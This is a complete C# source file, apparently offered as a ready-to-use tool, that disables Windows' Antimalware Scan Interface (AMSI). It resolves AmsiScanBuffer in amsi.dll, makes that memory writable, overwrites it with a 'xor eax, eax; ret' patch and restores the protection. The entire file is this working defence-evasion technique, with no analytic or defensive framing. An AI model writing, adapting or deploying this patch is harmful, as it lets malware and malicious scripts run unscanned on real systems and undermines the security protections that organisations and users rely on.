using System;
using System.Reflection;
using System.Runtime.InteropServices;

public static class AmsiBypass
{
    [DllImport("kernel32")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    public static void Bypass()
    {
        IntPtr amsi = GetProcAddress(GetModuleHandle("amsi.dll"), "AmsiScanBuffer");

        uint oldProtect;
        VirtualProtect(amsi, (UIntPtr)6, 0x40 /* PAGE_EXECUTE_READWRITE */, out oldProtect);

        // Patch bytes: xor eax, eax; ret
        byte[] patch = new byte[] { 0x31, 0xC0, 0xC3 };
        Marshal.Copy(patch, 0, amsi, patch.Length);

        VirtualProtect(amsi, (UIntPtr)6, oldProtect, out oldProtect);
    }
}
